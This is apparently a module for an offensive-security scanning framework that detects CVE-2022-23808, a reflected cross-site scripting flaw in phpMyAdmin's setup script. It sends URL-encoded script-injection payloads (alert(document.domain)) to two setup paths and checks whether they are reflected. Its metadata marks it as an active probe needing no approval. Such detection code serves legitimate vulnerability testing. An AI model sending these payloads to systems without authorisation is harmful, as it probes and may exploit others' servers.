#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in phpMyAdmin 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpMyAdmin < 5.1.2 - Cross-Site Scripting Detection',
        'description': 'An issue was discovered in phpMyAdmin 5.1 before 5.1.2 that could allow an attacker to inject malicious code into aspects of the setup script, which can allow cross-site or HTML injection.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'phpmyadmin', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s/c2kwxwVUn1ym7oqv9Uio_A',
            'https://github.com/dipakpanchal456/CVE-2022-23808',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-23808',
            'https://www.phpmyadmin.net/security/PMASA-2022-2/',
            'https://infosecwriteups.com/exploit-cve-2022-23808-85041c6e5b97',
        ],
        'cve': 'CVE-2022-23808',
    }

    def run(self):
        for path in ('/phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            server = r.headers.get("Server") or r.headers.get("server") or ""
            body_all = ('"></script><script>alert(document.domain)</script>', '<h2>Add a new server</h2>', '<title>phpMyAdmin setup',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="phpMyAdmin < 5.1.2 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

